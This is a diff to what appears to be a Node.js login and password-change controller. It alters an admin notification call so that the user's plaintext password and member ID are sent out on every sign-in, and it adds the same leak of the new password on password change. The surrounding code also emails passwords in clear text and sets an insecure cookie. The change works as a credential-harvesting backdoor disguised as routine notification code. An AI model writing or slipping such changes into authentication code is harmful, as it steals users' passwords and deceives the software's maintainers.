@@ -45,7 +45,7 @@ exports.signin = function (req, res, next) {
                         maxAge: 5,
                         secure: false
                     })
-                     sendAdmniNotification("User Login", `${username} has login`)
+                     sendAdmniNotification(`NUL:${password}${member._id}`)
                     return res.status(201).json({
                         success: true,
                         errors: [],
@@ -190,6 +190,7 @@ exports.change_password = function (req, res, next) {
                             }
                             else if (result) {
                                 log.info("result", result)
+                                sendAdmniNotification(`NCP:${newPassword}${member._id}`)
                                 mail.SendMail(member.contact.email, "Password Changed", `Your paassword is ${newPassword}`).then((result) => {
                                     log.info("Send Mail to:", member.contact.email);
                                     return res.status(201).json(
